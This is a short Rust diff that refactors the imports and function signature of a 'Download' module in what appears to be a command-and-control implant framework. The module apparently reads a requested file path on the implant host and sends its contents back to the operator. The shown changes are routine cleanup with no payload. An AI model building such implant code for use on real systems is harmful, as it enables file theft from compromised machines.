@@ -1,13 +1,9 @@
-use crate::{check_field, check_request, Module, ModuleImpl, Result, TaskResult};
-use async_trait::async_trait;
 use malefic_helper::common::filesys::check_sum;
-use malefic_helper::{debug, to_error};
-use malefic_proto::proto::modulepb::{DownloadResponse, Block};
-use malefic_proto::proto::implantpb::{spite::Body};
-use malefic_trait::module_impl;
+use malefic_proto::proto::modulepb::{Block, DownloadResponse};
 use std::fs::{metadata, OpenOptions};
 use std::io::Read;
 use futures::SinkExt;
+use crate::prelude::*;
 
 pub struct Download {}
 
@@ -20,9 +16,9 @@ impl ModuleImpl for Download {
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut crate::Input,
-        sender: &mut crate::Output,
-    ) -> Result {
+        receiver: &mut malefic_proto::module::Input,
+        sender: &mut malefic_proto::module::Output,
+    ) -> ModuleResult {
         let request = check_request!(receiver, Body::DownloadRequest)?;
         let path: String = check_field!(request.path)?;
         let path_clone = path.clone();
